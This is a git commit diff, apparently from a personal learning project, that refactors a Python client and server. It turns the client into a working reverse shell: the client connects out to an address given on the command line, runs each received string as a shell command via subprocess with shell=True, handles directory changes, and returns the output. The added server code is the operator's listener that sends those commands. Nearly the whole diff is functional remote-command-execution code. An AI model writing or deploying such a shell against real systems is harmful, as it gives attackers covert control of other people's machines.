fb2bea6f0f899911bba4e7b75f6dbf5b64866455
Jesse Lesperance <jesse@lesperance.io>
2023-04-22 22:59:22 -0700

    Refactoring of code;  added error handling

--- client.py
+++ client.py
@@ -1,36 +1,59 @@
 import socket
+import subprocess
+import os
+import sys
 
-
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-target_ip = '127.0.0.1'
-target_port = 2222
 
 def session_handler():
     print(f'[+] Connecting to {target_ip}.')
     sock.connect((target_ip, target_port))
     print(f'[+] Connected to {target_ip}.')
     while True:
-        try:
-            print('[+] Awaiting response...')
-            message = sock.recv(1024).decode()
-            if message == 'exit':
-                print('[-] The server has terminated the session.')
-                sock.close()
-                break
-            print(message)
-            response = input('Message to send#> ')
-            if response == 'exit':
-                sock.send(response.encode())
-                sock.close()
-                break
-            sock.send(response.encode())
-        except KeyboardInterrupt:
-            print('[+] Keyboard interrupt issued.')
+        message = inbound()
+        print(f'[+] Message received - {message}')
+        if message == 'exit':
+            print('[-] The server has terminated the session.')
             sock.close()
             break
+        elif message.split(" ")[0] == 'cd':
+            try:
+                directory = str(message.split(" ")[1])
+                os.chdir(directory)
+                cur_dir = os.getcwd()
+                print(f'[+] Changed to {cur_dir}')
+                outboud(cur_dir)
+            except FileNotFoundError:
+                outboud('Invalid directory.  Try again.')
+                continue
+        else:
+            command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
+            output = command.stdout.read() + command.stderr.read()
+            outboud(output.decode())
+
+
+def inbound():
+    print('[+] Awaiting response...')
+    message = ''
+    while True:
+        try:
+            message = sock.recv(1024).decode()
+            return message
         except Exception:
             sock.close()
-            break
 
 
-session_handler()
+def outboud(message):
+    response = str(message).encode()
+    sock.send(response)
+
+
+if __name__ == '__main__':
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        target_ip = sys.argv[1]
+        target_port = int(sys.argv[2])
+        session_handler()
+    except IndexError:
+        print('[-] Command line argument(s) missing.  Please try again.')
+    except Exception as e:
+        print(e)
--- server.py
+++ server.py
@@ -1,26 +1,26 @@
 import socket
+import sys
 
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-
-host_ip = '127.0.0.1'
-host_port = 2222
 
 def listener_handler():
     sock.bind((host_ip, host_port))
     print('[+] Awaiting connection from client...')
     sock.listen()
     remote_target, remote_ip = sock.accept()
+    comm_handler(remote_target, remote_ip)
+
+
+def comm_handler(remote_target, remote_ip):
     print(f'[+] Connection received from {remote_ip[0]}')
     while True:
         try:
             message = input('Message to send#> ')
             if message == 'exit':
-                remote_target.send(message.encode())
+                comm_out(remote_target, message)
                 remote_target.close()
                 break
-            remote_target.send(message.encode())
-            response = remote_target.recv(1024).decode()
-            print(response)
+            comm_out(remote_target, message)
+            response = comm_in(remote_target)
             if response == 'exit':
                 print('[-] The client has terminated the session.')
                 remote_target.close()
@@ -28,6 +28,8 @@ def listener_handler():
             print(response)
         except KeyboardInterrupt:
             print('[+] Keyboard interrupt issued.')
+            message = 'exit'
+            comm_out(remote_target, message)
             remote_target.close()
             break
         except Exception:
@@ -35,6 +37,40 @@ def listener_handler():
             break
 
 
-listener_handler()
+def comm_in(remote_target):
+    print('[+] Awaiting response...')
+    response = remote_target.recv(1024).decode()
+    return response
 
 
+def comm_out(remote_target, message):
+    remote_target.send(message.encode())
+
+
+def banner():
+    print('                                                                                                                                                           _..._                   ')
+    print('                                 _______                                                         _______                                                .-\'_..._\'\'.     .-\'\'-.     ')
+    print('             .                   \  ___ `\'.                                /|                .--.\  ___ `\'.                 __.....__                 .\' .\'      \'.\  .\' .-.  )    ')
+    print('           .\'|                    \' |--.\  \                        _     _||                |__| \' |--.\  \    .--./)  .-\'\'         \'.              / .\'            / .\'  / /     ')
+    print('          <  |                    | |    \  \'     .-\'\'` \'\'-.  /\    \\\\   //||        .-,.--. .--. | |    \  \'  /.\'\'\\\\  /     .-\'\'"\'-.  `.           . \'             (_/   / /      ')
+    print('           | |             __     | |     |  \'  .\'          \'.`\\\\  //\\\\ // ||  __    |  .-. ||  | | |     |  \'| |  | |/     /________\   \          | |                  / /       ')
+    print('       _   | | .\'\'\'-.   .:--.\'.   | |     |  | /              ` \`//  \\\'/  ||/\'__ \'. | |  | ||  | | |     |  | \`-\' / |                  |          | |                 / /        ')
+    print('     .\' |  | |/.\'\'\'. \ / |   \ |  | |     \' .\'\'                \' \|   |/   |:/`  \'. \'| |  | ||  | | |     \' .\' /("\'`  \    .-------------\'          . \'                . \'         ')
+    print('    .   | /|  /    | | `" __ | |  | |___.\' /\' |         .-.    |  \'        ||     | || |  \'- |  | | |___.\' /\'  \ \'---. \    \'-.____...---.           \ \'.          .  / /    _.-\') ')
+    print('  .\'.\'| |//| |     | |  .\'.\'\'| | /_______.\'/  .        |   |   .           ||\    / \'| |     |__|/_______.\'/    /\'""\'.\ `.             .\'             \'. `._____.-\'/.\' \'  _.\'.-\'\'  ')
+    print('.\'.\'.-\'  / | |     | | / /   | |_\_______|/    .       \'._.\'  /            |/\\\'..\' / | |         \\_______|/    ||     ||  `\'\'-...... -\'                 `-.______ //  /.-\'_.\'      ')
+    print('.\'   \_.\'  | \'.    | \'.\ \._,\ \'/               \'._         .\'             \'  `\'-\'`  |_|                       \\\'. __//                                          `/    _.\'         ')
+    print('           \'---\'   \'---\'`--\'  `"                   \'-....-\'`                                                    `\'---\'                                           ( _.-\'            ')
+
+
+if __name__ == '__main__':
+    banner()
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    try:
+        host_ip = sys.argv[1]
+        host_port = int(sys.argv[2])
+        listener_handler()
+    except IndexError:
+        print('[-] Command line argument(s) missing.  Please try again.')
+    except Exception as e:
+        print(e)
